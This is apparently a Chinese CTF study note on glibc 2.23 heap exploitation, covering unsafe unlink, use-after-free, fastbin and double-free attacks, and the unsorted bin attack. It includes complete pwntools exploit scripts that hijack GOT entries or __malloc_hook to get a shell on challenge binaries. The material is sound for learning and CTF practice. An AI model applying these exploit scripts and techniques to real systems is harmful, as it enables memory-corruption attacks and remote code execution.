[toc]

# heap

## tips

- 在32位下，若申请一个大小为0x8的chunk，那么总共会得到的chunk的大小为0x10，原因是会加上一个0x8的header。
- 一个`word`是2字节，那么`DWORD`是4字节，`QWORD`是8字节。
- 同样的，在64位下，若申请一个大小为0x8的chunk，那么总共得到的chunk的大小为0x18，原因是会加上一个0x10的header。
- `BUU`的`glibc`是`glibc2.23-0ubuntu11`

## pwndbg命令

```bash
parseheap # 可以查看当前的所有chunk，以及chunk的地址、prev大小、size、status和fd等等。

hex 0x8e1000 2300 # 可以查看0x8e1000地址往后2300个长度存放的值

telescope 0x602300 # 可以查看目标地址内存放的指针指向的值和地址

x/nuf 0x123456 
n表示显示的长度
u可以填b表示字节，h表示双字节，w表示四字节，g表示八字节
f表示显示数据的格式，例如x表示十六进制，u表示十六进制无符号，d表示十进制，s表示字符串
例如x/32gx &main_arena表示将main_arena地址处的值输出32个，每一个值是8字节的十六进制数。
查看&main_arena前面0x40字节处：x/32gx (long long)(&main_arena) - 0x40

p func_name 打印函数的地址
p &a 查看变量a的地址
p/x &a 以十六进制的方式查看变量a的地址
p/x (0x12345678 - (long long)&main_arena) 计算大小需要转换类型
p *(0x123456) 查看0x123456地址处的值，区分x指令，x 0x123456可以同样效果

set $x = $libc 赋值
p/x $x
backtrace查看调用栈

arenainfo 显示所有arena的信息

canary 直接打印canary的值

find_fake_fast 可以通过偏移等方式寻找一个fake_chunk，主要用于double free时绕过安全检查。
如 find_fake_fast &__malloc_hook
```

## one_gadget使用

作用：

```tex
可以直接找到一个getshell的gadget。
```

安装

```bash
gem install one_gadget
```

使用

```bash
one_gadget ./libc.so.6 # 得到的是基于libc_base的gadget地址
```



## gcc使用指定版本glibc编译

首先要`glibc-all-in-one`不必多说

在gcc中，可以使用`-Wl,<options>`来将逗号分隔的`<options>`传递给链接器。

由此，若使用`glibc2.23`，则编译命令为：

```gcc
gcc -Wl,-rpath='/home/ltfall/Desktop/pwn/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/',-dynamic-linker='/home/ltfall/Desktop/pwn/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/ld-linux-x86-64.so.2' ./test.c -o test
```

即分别指定了`-rpath`和`-dynamic-linker`。



## 使用patchelf

有的题目需要更改`libc`版本，因此需要使用`patchelf`。

可以使用`glibc-all-in_one`这个工具来下载。

以`2.23-0ubuntu3_amd64`为例子，在`glibc-all-in_one`目录下使用：

```bash
./download 2.23-0ubuntu3_amd64
```

上面这条命令可以下载下来对应的`glibc`，`download`那个脚本已经被我更改成外网的源了，因为默认清华源是没有的。

下好之后在`glibc-all-in-one/libs`目录下。

使用如下两条命令，进行`glibc`的切换：

```bash
patchelf --set-interpreter ~/Desktop/pwn/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/ld-2.23.so ./uunlink
patchelf --set-rpath ~/Desktop/pwn/glibc-all-in-one/libs/2.23-0ubuntu3_amd64 ./uunlink
```

可以看到第二条命令是让它在文件夹里自动搜寻对应的版本，路径不要搞错了。

`ldd`一下可以看到已经修改成功：

```bash
ldd ./uunlink
```

![image-20230108175223269](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202301081752097.png)

## glibc源码

我是在[这里]([glibc package : Ubuntu (launchpad.net)](https://launchpad.net/ubuntu/+source/glibc/))找的，找到对应版本，比如我这里是想看看`2.23-0ubuntu3`的，就下了这个：

![image-20230108194726875](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202301081947999.png)

然后找到里面的这一个：

![image-20230108194754494](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202301081947637.png)

下载到`ubuntu`然后解压即可。

然后，可以通过[这里]([Code browser - Explore C++ code on the web](https://codebrowser.dev/))来搜寻对应的函数或者文件，或者也可以直接在这里查看，但为了调试，可以仅仅只是找到在哪里，如图：

![image-20230108195407693](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202301081954192.png)

打开之后，发现是在`glibc/malloc/malloc.c`里面。开始`read the fucking code`吧。



## unsafe unlink

一句话，`unsafe unlink`漏洞是：控制相邻两个`chunk`的`prev size`和`prev_inuse`和`fd bk`等字段的值，以及攻击者明确存放这些`chunk`的地址的指针时，使得程序对不正确的位置进行`unlink`，从而达到任意地址写的目的。

**注意，`small bin`和`fastbin `不会使用`unlink`。**

接下来，我们一步步地看，第一步需要明确什么是正常的`unlink` 。

试想，假如有两个物理相邻的`chunk`，第一个是`free`的，而第二个是`used`。此时，若第二个`chunk`被`free`时，由于前一个`chunk`和他是物理相邻且被`free`的，因此第一个和第二个`chunk`将被合并，且是第一个`chunk`后向合并第二个，并且修改第一个`chunk`的`size`，即合并之后的`size`。

合并时，由于第一个`chunk`本身是处在双向链表`bins`里面的，因此需要把第一个`chunk`从`bins`里面删除，待合并后再放到`unsorted bin`里面去。而第一个`chunk`从`bin`里面删除的操作就叫做`unlink`。

由于之前第一个`chunk`所在的地方是一个双向链表，因此把第一个`chunk`从`bin`里面删除的过程是这样：先断开`chunk`和前后两个`chunk`的指针，然后把它之前的`chunk`指向它后面的，它后面的`chunk`指向它之前的。画个草图示意一下：

![image-20230108202216108](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202301082022679.png)

这就是正常的`unlink`流程。然而，`unsafe unlink`是利用其中的漏洞。

我们看`unlink`部分的源码：

```c
/* Take a chunk off a bin list */
#define unlink(AV, P, BK, FD) { 
    // 注意这里是glibc2.23，若为更高版本，开头会进行检查即P的chunksize是否等于P的下一个chunk的prevsize。                                           
    FD = P->fd;	// 将要unlink的前向为FD							      
    BK = P->bk;	 // 将要unlink的后向为BK						      
    if (__builtin_expect (FD->bk != P || BK->fd != P, 0))		      
        // 这个if语句是一个检查。假如FD的后向不是P，BK的前向不是P，就无法通过检查。
        // 因此，若想使用unsafe unlink漏洞，需要保证FD的后向是P，BK的前向是P。
      malloc_printerr (check_action, "corrupted double-linked list", P, AV);  
    else {								      
        // 通过上面的安全检查了，那接下来就进行unlink。 若是使用bk或者fd指针的chunk，那么下面两行后就结束了。
        FD->bk = BK; // 将FD的后向连接到BK 							      
        BK->fd = FD; // 将BK的前向连接到FD						
        // 假如连接方式不是bk和fd指针，那就需要判断是不是用的fd_nextsize或者bk_nextsize指针。	      
        if (!in_smallbin_range (P->size)				      
            && __builtin_expect (P->fd_nextsize != NULL, 0)) {  // 这个if判断1.不是smallbin(fd/bk)2.有用到fd_nextsize    
              if (__builtin_expect (P->fd_nextsize->bk_nextsize != P, 0)	      
            || __builtin_expect (P->bk_nextsize->fd_nextsize != P, 0)) // 安全检查：P的后向的前向确实为P，和本宏第一个if作用类似。利用漏洞需要突破这个    
                malloc_printerr (check_action,				      
                    "corrupted double-linked list (not small)",    
                    P, AV);				      
                    if (FD->fd_nextsize == NULL) {		// 这里有点没懂为啥是FD的前向
                          if (P->fd_nextsize == P) // 假如P的前向还是P，说明这个链表就P一个，后面暂时没看懂		     
                            FD->fd_nextsize = FD->bk_nextsize = FD;	
                          else {							      
                              FD->fd_nextsize = P->fd_nextsize;			      
                              FD->bk_nextsize = P->bk_nextsize;			      
                              P->fd_nextsize->bk_nextsize = FD;			      
                              P->bk_nextsize->fd_nextsize = FD;			      
                            }							      
                      } else {
                        // unlink的正常操作							      
                        P->fd_nextsize->bk_nextsize = P->bk_nextsize;		      
                        P->bk_nextsize->fd_nextsize = P->fd_nextsize;		      
                      }								      
          }								      
      }									      
}
```

可以知道，设`FD = P->fd，BK = P-> bk`只要满足安全检查：

```
FD的bk等于P，且BK的fd等于P
```

就会实现：

```
FD->bk = BK
BK->fd = FD
```

再看一下触发`unlink`操作的源码，此处以`free`为例子：

```c
if (!prev_inuse(p)) { // 若P物理地址的上一个chunk没有被使用，那么free P时，P和上一个chunk将进行合并，并将上一个chunk unlink
    prevsize = p->prev_size; // P的上一个chunk的大小
    size += prevsize;  // P的size加上上一个chunk的size，就得到了合并后的size
    p = chunk_at_offset(p, -((long) prevsize));  // 通过prevsize，向上偏移得到上一个chunk
    unlink(av, p, bck, fwd); // 此时P已经是上一个chunk的指针，将其unlink
}
```

`unsafe unlink`就是通过溢出，在P的上一个chunk中的用户可用部分伪造一个小chunk，从而达到任意地址写的目的。首先看图：

![image-20230110180557450](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202301101805328.png)

上图是P和P的上一个Chunk，称为Prev Chunk。只要Chunk P中的P为0，那么Prev Chunk就会被识别为freed chunk。此时若再对Chunk P进行free操作，那么Prev Chunk就会被unlink。

试想，若我们修改Chunk P的Prev_Size的值，那么便可以对被`unlink`的地方任意控制！以64位为例，我们若将Prev_Size的值缩小0x8，那么Chunk P的上一个Chunk将是上图中Prev Chunk的Size部分，而不是正确的Prev_Size部分。由此，我们可以通过伪造P的Prev Size，使得对指定位置进行`unlink`。

若将Chunk P的Prev_Size缩小0x10，那么将会对Prev Chunk的fd指针处开始unlink，而这个地方恰好一般是可控的，因此相当于我们在此处完全可以伪造一个新的Chunk，如图所示：

![image-20230110180522157](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202301101805007.png)

下划线部分是人为控制的，需要尽量控制这些值才可以进行`unsafe unlink`。

伪造的Fake Chunk是虚线框部分。

此时，若对Chunk P进行free，那么Fake Chunk将会被unlink。

我们回顾`unlink`部分：

```c
#define unlink(AV, P, BK, FD) {                                          
    FD = P->fd;							      
    BK = P->bk;	 					      
    if (__builtin_expect (FD->bk != P || BK->fd != P, 0))		      
      malloc_printerr (check_action, "corrupted double-linked list", P, AV);  
    else {								      
        FD->bk = BK; 						      
        BK->fd = FD; 
    }
... 
```

此时传入unlink宏的P，即是Fake Chunk。

那么很明显，满足安全机制`P->fd->bk == P`以及`P->bk->fd == P`才可以进行赋值操作。

我们知道，bk指针实际上只是偏移0x18个字节，fd指针实际上只是偏移0x10字节。

因此：

```c
P->fd->bk == P;
// 等价于
*(P->fd + 0x18) == P;
// 等价于
P->fd + 0x18 == &P;
// 等价于
P->fd = &P - 0x18
```

由此看来，我们只要满足fake chunk中的fd的值为&P - 0x18，即可绕过安全机制。

同样的，bk的值需要为&P - 0x10。注意，这里的P是合并到的地址。

若此时有一个数组/指针，专门用于存放这些`chunk`的地址时，&P便是可知的。

满足安全机制后，便会进行unlink：`FD->bk = Bk , BK->fd = FD`，如下：

```c
P->fd->bk = P->bk;
// 等价于
*(P->fd + 0x18) = &P - 0x10;
// 等价于
*(&P) = &P - 0x10;
P = &P - 0x10;

// 第二行同样：
P->bk->fd = P->fd;
// 等价于：
P = &P - 0x18;
// 即： P指向P自己的地址减去0x18的地方！
```

在可以利用的情况下，用户是可以对自己malloc的chunk进行修改的。因此对prev chunk进行修改，直接会变为修改存放这些chunk的数组/指针的值，我们便可以使其指向任意地址，并完成任意地址写。



### 例题uunlink

exp:

```python
from pwn import *
local = 1
elf = ELF('./uunlink')
context(log_level='debug')
if local:
    p = process('./uunlink')
    libc = elf.libc


def malloc(index, size):
    p.recvuntil('Your choice: ')
    p.sendline('1')
    p.recvuntil('Give me a book ID: ')
    p.sendline(str(index))
    p.recvuntil('how long: ')
    p.sendline(str(size))


def free(index):
    p.recvuntil('Your choice: ')
    p.sendline("3")
    p.recvuntil("Which one to throw?")
    p.sendline(str(index))


def edit(index, size, content):
    p.recvuntil('Your choice: ')
    p.sendline('4')
    p.recvuntil('Which book to write?')
    p.sendline(str(index))
    p.recvuntil("how big?")
    p.sendline(str(size))
    p.recvuntil("Content: ")
    p.sendline(content)

def debug():
    pid = util.proc.pidof(p)[0]
    print('pid:{}'.format(pid))
    gdb.attach(pid)
    pause()


# 创建四个chunk 
malloc(0, 0x30)
malloc(1, 0xf0)
malloc(2, 0x100)
malloc(3, 0x100)


# 下面伪造fake chunk，并通过溢出修改第二个chunk的prev_inuse，prev_size等
fd = 0x602300 - 0x18
bk = 0x602300 - 0x10
py = b''
py += p64(0) + p64(0x31)
py += p64(fd) + p64(bk)
py += p64(0) + p64(0)
py += p64(0x30) + p64(0x100)
py += p64(0) + p64(0)
py += p64(0) + p64(0)
edit(0, 0x60, py)
# free会触发unlink
free(1)

# 接下来，edit第一个chunk会导致本来指向这些chunk的指针指向别的地方
atoi_got = elf.got['atoi']
free_got = elf.got['free']
py = b''
py += b'a'*0x18 + p64(atoi_got) + p64(atoi_got) + p64(free_got)
edit(0, 0x30, py)


# 这里将free的got表指向puts_plt，调用free时会变成调用puts
edit(2, 0x8, p64(elf.plt['puts']))
# 下面是程序里的free，其实是执行free(chunk[0])，也就是puts(chunk[0])，会打印atoi的got表
free(0)
a = p.recv()
atoi_libc = u64(p.recv(6).ljust(8, b'\x00'))
libc_base = atoi_libc - libc.symbols['atoi']
system_libc = libc_base + libc.symbols['system']
edit(1, 0x8, p64(system_libc))
p.recvuntil('Your choice: ')
p.sendline(b'/bin/sh\x00')
p.interactive()
```



## use after free (UAF)

顾名思义，`use after free`是对已经被`free`的内容进行读写的操作。若用户在对指针进行`free`操作后没有将其置空，则该指针可能仍然可以被使用。（根据测试，`glibc2.23`中仍然可以使用，但在最新版本中对`free`后的指针使用会报错，具体修复版本待测试）

以一道例题`hacknote`为例子：

![image-20230209153120915](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202302091531551.png)

`32位程序`，经典菜单，这个程序有三种功能，即添加、删除、打印`note`。

`add_note`部分代码如下：

```c
unsigned int add_note()
{
  _DWORD *v0; // ebx
  signed int i; // [esp+Ch] [ebp-1Ch]
  int size; // [esp+10h] [ebp-18h]
  char buf; // [esp+14h] [ebp-14h]
  unsigned int v5; // [esp+1Ch] [ebp-Ch]

  v5 = __readgsdword(0x14u);
  if ( count <= 5 )
  {
    for ( i = 0; i <= 4; ++i ) // 最多有五个note
    {
      if ( !notelist[i] )
      {
        notelist[i] = malloc(8u); // notelist[i]申请了8字节空间
        if ( !notelist[i] )
        {
          puts("Alloca Error");
          exit(-1);
        }
        *(_DWORD *)notelist[i] = print_note_content; // 前面四字节空间指向打印函数
        printf("Note size :");
        read(0, &buf, 8u);
        size = atoi(&buf);
        v0 = notelist[i]; // notelist[i]赋值给v0
        v0[1] = malloc(size);  // v0是DWORD，四字节，那么就是notelist[i]的后面四字节指向大小为size的一片空间
        if ( !*((_DWORD *)notelist[i] + 1) )
        {
          puts("Alloca Error");
          exit(-1);
        }
        printf("Content :");
        read(0, *((void **)notelist[i] + 1), size); // 赋值到notelist[i]的后面四字节指向的位置
        puts("Success !");
        ++count;
        return __readgsdword(0x14u) ^ v5;
      }
    }
  }
  else
  {
    puts("Full");
  }
  return __readgsdword(0x14u) ^ v5;
}
```

从上面可以看出，最多有5个note，每一个note为8字节，前四字节指向一个打印内容的函数，后四字节指向大小为size的一片空间，其中size和该空间的内容都是用户输入的。

接下来是`delete_note`部分：

```c
unsigned int del_note()
{
  int v1; // [esp+4h] [ebp-14h]
  char buf; // [esp+8h] [ebp-10h]
  unsigned int v3; // [esp+Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  printf("Index :");
  read(0, &buf, 4u);
  v1 = atoi(&buf);
  if ( v1 < 0 || v1 >= count )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( notelist[v1] )
  {
    free(*((void **)notelist[v1] + 1));
    free(notelist[v1]);
    puts("Success");
  }
  return __readgsdword(0x14u) ^ v3;
}
```

可以看到有两个`free`操作，第一个是对每一个note的后四字节指向的content，第二个是对note本身。

本题的核心就是这里在`free`过后是没有进行置零操作的，因此在老版本的`glibc`中，仍然可以对其进行操作。

再看最后的`print_note`：

```c
unsigned int print_note()
{
  int v1; // [esp+4h] [ebp-14h]
  char buf; // [esp+8h] [ebp-10h]
  unsigned int v3; // [esp+Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  printf("Index :");
  read(0, &buf, 4u);
  v1 = atoi(&buf);
  if ( v1 < 0 || v1 >= count )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( notelist[v1] )
    (*(void (__cdecl **)(_QWORD *))notelist[v1])(notelist[v1]); // 调用函数
  return __readgsdword(0x14u) ^ v3;
}
```

可以看到进行打印note的函数逻辑是，调用notelist[i]的前四个字节的函数，且将notelist[i]本身作为参数传递。

`print_note_content`函数，也就是每个notelist[i]的前四个字节的函数如下：

```c
int __cdecl print_note_content(int a1)
{
  return puts(*(const char **)(a1 + 4)); // puts函数对传进来的参数偏移4字节的地方输出
}
```

程序中可能用到的一处后门函数：

```c
int magic()
{
  return system("cat flag");
}
```

该后门函数入口地址是`0x08048986`。

现在我们已经明白整个程序的工作流程了。由于`free`后，程序并没有将指针置零，因此用户可以对已经被`free`的内容进行修改。那如何进行修改呢？实际上，当用户申请的`chunk`被`free`以后，该`chunk`会添加到`fastbin`中，若用户再次申请等同于该`chunk`大小的空间时，该`chunk`又会被分配给用户使用。在本程序中，用户只能在`add_note`中对`chunk`进行赋值，由此可以用如下流程进行`UAF`:

- 用户添加两块大小为0x10字节的note，分别设为note0和note1
- 申请每个note时，会先申请0x8字节用于存放note的两个指针。
- 删除note0，再删除note1。那么有四个空间被`free`，分别为：大小为0x8字节的note0的空间，note0后四字节指向的大小为0x10的content的空间，大小为0x8字节的note1的空间，note1后四字节指向的大小为0x10的content的空间。
- 由于fastbins是先进后出，因此fastbin链表中有：大小为0x10字节的note1->note0，大小为0x18字节的content1->content0。注意其中加上了header的0x8字节，32位下是0x8字节的header。
- 用户此时再申请一个大小为0x8的note，设为note2，先申请0x8字节用于存放note2的两个指针，那么这里申请到的0x8字节的空间实际上是note1。再申请0x8字节的空间用于存放note2后四字节指向的content，这里实际上申请到的是note0。
- 用户申请note2时可以对其进行赋值，赋值实际上是对note0进行修改。若对其赋值为`0x08048986`，那么note0的前四字节将会被修改为`0x08048986`。此时用户对note0进行打印操作，那么会调用`0x08048986`处的函数，也就是后门函数，成功执行漏洞。

`exp`如下：

```python
from pwn import *

context(log_level='debug')
sh = process('./hacknote')
elf = ELF('./hacknote')
libc = elf.libc

def debug():
    pid = util.proc.pidof(sh)[0]
    print('pid:{}'.format(pid))
    gdb.attach(pid)
    pause()

def add_note(size, content):
    sh.recvuntil('Your choice :')
    sh.sendline('1')
    sh.recvuntil('Note size :')
    sh.sendline(str(size))
    sh.recvuntil('Content :')
    sh.sendline(content)

def delete_note(index):
    sh.recvuntil('Your choice :')
    sh.sendline('2')
    sh.recvuntil('Index :')
    sh.sendline(str(index))

def print_note(index):
    sh.recvuntil('Your choice :')
    sh.sendline('3')
    sh.recvuntil('Index :')
    sh.sendline(str(index))

add_note(0x10, 'test')
add_note(0x10, 'what')
delete_note(0)
delete_note(1)
# debug()
add_note(0x8, p32(0x08048986))
print_note(0)
sh.interactive()
```

## fastbin attack

首先要知道`fastbin`的`chunk`的大小范围。

> 32位下，fastbin chunk的范围是16字节 - 64字节（0x10 - 0x40）
>
> 64位下，fastbin chunk的范围是32字节-128字节（0x20 - 0x80）
>
> 注意，这是加上header的大小。

`fastbin`方法流程比较简单，即通过某种手段能够控制`fastbin`中的`chunk`的`fd`指针时，将其指向一个想要往其写入数据的地方，这样再次`malloc`这个大小的`chunk`的时候就可以将这个地方分配为`chunk`，达到任意地址写的效果。但是条件如下：

- fake chunk 的 ISMMAP 位不能为 1，因为 free 时，如果是 mmap 的 chunk，会单独处理。
- fake chunk 地址需要对齐， MALLOC_ALIGN_MASK
- **fake chunk 的 size 大小需要满足对应的 fastbin 的需求，同时也得对齐。**
- fake chunk 的 next chunk 的大小不能小于 `2 * SIZE_SZ`，同时也不能大于`av->system_mem` 。
- fake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成 double free 的情况。

要注意，被指向的地方的`chunk header`中的`size`必须满足`fastbin`的要求，即大小和`fastbin`中指向该`fake chunk`的`chunk`大小相同。若无法直接找到，可以利用地址偏移一些来寻找，也可以借助工具，比如`pwndbg`中可以使用`find_fast_chunk addr`来寻找一个可以覆盖掉`addr`地址的`chunk`。

例题是0ctf_2017_nanyheap：

整体思路是使用`unsort bin`泄露`main_arena`（`unsort bin`在只有一个`chunk`的时候`fd`和`bk`都指向`main_arena`的某个固定偏移处），再通过`main_arena`计算偏移得到`libc`和其他函数地址。

之后使用`fastbin attack`来向`__malloc_hook`中写入`one_gadget`算出来的`gadget`即可。注意，本来`malloc_hook`前是没有明显的可以分配的`fastbin`大小的`chunk`的，但是可以通过小部分偏移来得到刚好可以覆盖掉`__malloc_hook`的`chunk`，此处在`pwngdb`使用命令`find_fast_chunk &__malloc_hook`即可。

```python
# value
# size
# pointer -> malloc(size)
from pwn import *
from LibcSearcher import *

filename = './0ctf_2017_babyheap'
context(log_level='debug')
local = 1
elf = ELF(filename)
# libc = ELF('./libc.so.6')
# libc = ELF('/home/ltfall/Desktop/pwn/buuctf_libc/ubuntu16_64/libc-2.23.so')

if local:
    sh = process(filename)
else:
    sh = remote('node4.buuoj.cn', 25212)

def debug():
    pid = util.proc.pidof(sh)[0]
    gdb.attach(pid)
    pause()

def allocate(size):
    sh.sendlineafter(': ', '1')
    sh.sendlineafter(': ', str(size))

def fill(index, size, content):
    sh.sendlineafter(': ', '2')
    sh.sendlineafter(': ', str(index))
    sh.sendlineafter(': ', str(size))
    sh.sendafter(': ', content)

def free(index):
    sh.sendlineafter(': ', '3')
    sh.sendlineafter(': ', str(index))

def dump(index):
    sh.sendlineafter(': ', '4')
    sh.sendlineafter(': ', str(index))

# 首先申请三个0x80的chunk，大概思路是先free第1个chunk，然后通过第0个chunk溢出修改第1个chunk的head，让OS误认为chunk1的大小是chunk1+chunk2
# 此时申请回chunk1，但是chunk1此时就是chunk1+chunk2两个块重合了，然后因为题目里面是calloc，因此将变成0的恢复，然后free掉chunk2，chunk2将会被添加到unsortbin
# 因此chunk2的fd和bk都会指向main_arena，此时打印chunk1，打印的实际上是chunk1+chunk2两个块，因此可以打印出chunk2的fd和bk，并由此得出&main_arena、libc_addr。
allocate(0x80)
allocate(0x80)
allocate(0x80)
allocate(0x20) # 没有这个 做不出来 挺怪的
free(1)
fill(0, 0x90, b'a'*0x80 + p64(0) + p64(0x121))
allocate(0x110)
payload = b'a'*0x80 + p64(0) + p64(0x91) + b'c'*0x80 
fill(1, len(payload), payload)
free(2)
dump(1)
main_arena = u64(sh.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - 0x58
info('the addr of main_arena is {}'.format(hex(main_arena)))
libc_addr = main_arena - 0x3c4b20
info('the libc addr is {}'.format(hex(libc_addr)))
fake_chunk_addr = libc_addr + 0x3c4aed
info('the fake_chunk_addr is {}'.format(hex(fake_chunk_addr)))
malloc_hook = libc_addr + 0x3c4b10
info('the addr of malloc_hook is {}'.format(hex(malloc_hook)))

# 接下来是fastbin attack
allocate(0x80) # 还原
# 此时到这里 前面几个chunk不管了 接下来是以chunk4开始的fast bin大小的chunk
allocate(0x60) # chunk4
allocate(0x60) # chunk5
free(5)
payload = b'd'*0x60 + p64(0x70) + p64(0x71) + p64(fake_chunk_addr)
fill(4, len(payload), payload)
allocate(0x60) # 还是chunk5
allocate(0x60) # chunk6

one_gadget = 0x4526a
payload = b'a'*(0x23 - 0x10) + p64(libc_addr + one_gadget)
fill(6, len(payload), payload)

allocate(0x10)
sh.interactive()
```



### Double Free

顾名思义，也就是将一个已经在`fastbins`里面的`chunk`再次添加到`fastbins`里面去，添加完成后就会有两个同样的`chunk`在一个`bins`里面。

比如：

```c
void* chunk1 = malloc(0x10);
void* chunk2 = malloc(0x10);

free(chunk1);
free(chunk2);
free(chunk1);
```

这样一来，在`fastbins`的大小为`0x20`的`bin`中，就会有：

![image-20230217172959638](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/image-20230217172959638.png)

因为`chunk1`指向`chunk2`，因此最右边的`chunk1`也会指向`chunk2`。

**值得注意的是，`fastbin`会对直接与`main arena`连接的`chunk`进行检查，因此必须借助第二个`chunk`才可以让两个一样的`chunk`都在同一个`bins`里面。**

有什么用呢？

若此时我们再申请一个`chunk`，那么左边的`chunk1`将会被申请到，若我们能够修改`chunk1`，便相当于修改了还在`fastbins`里面的右边的`chunk`的`fd`指针。如此以来，若当目前在`fastbins`里面的`chunk`都被`free`了，由于最右边的那个`chunk1`的`fd`指针是我们设计的值，那么接下来再进行`malloc`操作时，便会将我们设计的值作为地址，将我们指定的地址作为一个`chunk`返回给我们。相当于是实现了一个任意地址写的功能。

**但没有那么简单，我们设计的值作为地址的地方要作为`chunk`返回，必须要满足一个条件，即这个`chunk`的`size`值必须和`bins`单链表里面的其他`chunk`相同。**这样一来就没有问题了。

#### 例题wustctf2020_easyfast

exp

```python
# uaf漏洞，借助了0x602088处的有一个50的值，因为double free任意写的chunk的size必须和分配的相等，不然报错。

from pwn import *

context(log_level='debug')

elf = ELF('./wustctf2020_easyfast')
# sh = process('./wustctf2020_easyfast')
sh = remote('node4.buuoj.cn', 27643)

def debug():
    pid = util.proc.pidof(sh)[0]
    gdb.attach(pid)
    pause()

def add(size):
    sh.recvuntil('choice>\n')
    sh.sendline('1')
    sh.recvuntil('size>\n')
    sh.sendline(str(size))

def delete(index):
    sh.sendlineafter('choice>\n', '2')
    sh.sendlineafter('index>\n', str(index))
    
def modify(index, content):
    sh.sendlineafter('choice>\n', '3')
    sh.sendlineafter('index>\n', str(index))
    sh.send(content)

add(0x40)
add(0x40)

delete(0)
delete(1)
delete(0)

modify(0, p64(0x602080))

# debug()
add(0x40)
add(0x40)

modify(3, p64(0))

sh.recvuntil('>\n')
sh.sendline('4')

sh.interactive()
```

## unsorted bin attack

广义上的`unsorted bin attack`其实分为`unsorted bin leak`和`unsorted bin attack`，前者可以根据`unsorted bin`的特性来泄露出`libc`的地址，后者的作用是对一个指定地址写入一个非常大的值（其实是写入`main_arena`的地址的一个偏移）。

### unsorted bin特性

首先是`unsorted bin`的来源，这里抄一下`wiki`

```
1.当一个较大的 chunk 被分割成两半后，如果剩下的部分大于 MINSIZE，就会被放到 unsorted bin 中。
2.释放一个不属于 fast bin 的 chunk，并且该 chunk 不和 top chunk 紧邻时，该 chunk 会被首先放到 unsorted bin 中。关于 top chunk 的解释，请参考下面的介绍。
3.当进行 malloc_consolidate 时，可能会把合并后的 chunk 放到 unsorted bin 中，如果不是和 top chunk 近邻的话。
```

然后是使用情况，抄一下`wiki`

```
1.Unsorted Bin 在使用的过程中，采用的遍历顺序是 FIFO，即插入的时候插入到 unsorted bin 的头部，取出的时候从链表尾获取。
2.在程序 malloc 时，如果在 fastbin，small bin 中找不到对应大小的 chunk，就会尝试从 Unsorted Bin 中寻找 chunk。如果取出来的 chunk 大小刚好满足，就会直接返回给用户，否则就会把这些 chunk 分别插入到对应的 bin 中。
```

用一下`gzy`的图

![img](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/876323_83TKRFDZJ5XP3GC.jpg)

### unsorted bin leak

从上图也可以看到，与`unsorted bin`直接相连的一个`bin`是最后插入到`unsorted bin`里面来的。它的`bk`指针指向`unsorted bin`。换句话说，它的`bk`指针指向`main_arena`的一个固定偏移，而`main_arena`和`libc_base`也有一个固定偏移，那么只要泄露出来了它的`bk`指针，也就不愁计算出`libc`的地址了。这里用先插入到`unsorted bin`的`fd`指针也是同理的。

### unsorted bin attack

作用是向指定地址写入一个非常大的值，即`main_arena`的一个固定偏移。

`unsotred bin attack`的攻击过程发生在这种情况：

调用`malloc`时，若`unsorted bin`里面恰好有对应的`chunk`大小，那么将对应的`chunk`取出来，该`chunk`也就被叫做`victim`。

来看这一小段`glibc2.23`的源代码：（第一行和第二行之间省略了一部分不影响的）

```c
bck = victim->bk;                        
unsorted_chunks (av)->bk = bck;
bck->fd = unsorted_chunks (av);
```

正常情况下，这一小段代码会将`victim`取出，而`unsorted bin`继续保持双向链表。

而攻击情况下，我们将控制`victim`的`bk`指针为希望进行地址修改的地方减去`8byte`的地方（32位为`4byte`）。

我们通过画图的方式来解释一下正常情况和攻击的情况。

首先是正常情况：

![image-20230623150536713](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/image-20230623150536713.png)如图所示，我们假设最后一个`chunk`刚好是`malloc`需要的大小，因此被标记为`victim`。

此时运行到第一行代码 `bck = victim->bk;`很简单，我们将`victim`的`bk`指针指向的`chunk`标记为`bck`。如图所示：

![image-20230623150554561](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/image-20230623150554561.png)

然后是第二行代码`unsorted_chunks (av)->bk = bck;` 很简单，本来`unsorted bin`的`bk`指针是指向`victim`的，而`victim`将要被`malloc`，因此先将`unsorted bin`的`bk`指针指向`bck`。

第三行代码`bck->fd = unsorted_chunks (av);`也很简单，和上面同理，我们要将`bck`的`fd`指针指向`unsorted bin`，以此将`victim`脱链。这两步如图所示：

![image-20230623151132502](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/image-20230623151132502.png)

此时实际上`victim`的两个指针还指向它们，但`unsorted bin`和`bck`指针都不再指向它，因此相当于`victim`已经被取出了。

现在我们考虑对其进行攻击的情况。若我们能够控制`victim`的`bk`指针，并将其指向一个`fake_chunk`（该`fake_chunk`的`fd`指针是我们希望修改的值。也就是`&fake_chunk + 0x10`，那么在代码的第一行`bck = victim->bk;   `，将会出现如图所示的情况：

![image-20230623151718915](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/image-20230623151718915.png)

那么第二行代码`unsorted_chunks (av)->bk = bck;`，将会将`unsorted bin`的`bk`指针也指向该`fake_chunk`。

第三行代码`bck->fd = unsorted_chunks (av);`则是攻击的真正实施：它将`bck`处的`fd`指针修改为了`unsorted bin`的地址。也就是实现了这一步：`*(&fake_chunk + 0x10) = unsorted_bin`。

此时如图所示：

![image-20230623152236540](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/image-20230623152236540.png)

至此，已经实现了攻击。

## 记一次下载glibc 2.23-0ubuntu11.2

